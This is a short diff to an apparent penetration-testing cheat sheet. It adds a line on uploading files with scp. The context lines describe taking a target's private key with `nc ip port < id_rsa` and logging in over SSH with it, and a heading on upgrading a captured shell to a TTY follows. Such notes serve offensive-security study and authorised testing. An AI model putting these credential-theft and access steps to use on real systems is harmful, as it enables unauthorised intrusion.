@@ -7,6 +7,7 @@
   - Download the private key: `nc ip port < id_rsa`
   - Change the permissions of the local private key to 600: `chmod 600 id_rsa`
   - Log in using SSH: `ssh -i id_rsa user@ip`
+ - Uploading files using `scp` over ssh: `scp -i id_rsa file user@ip:/path/to/out/dir/`
 
 # [Upgrading TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
 - With Python:
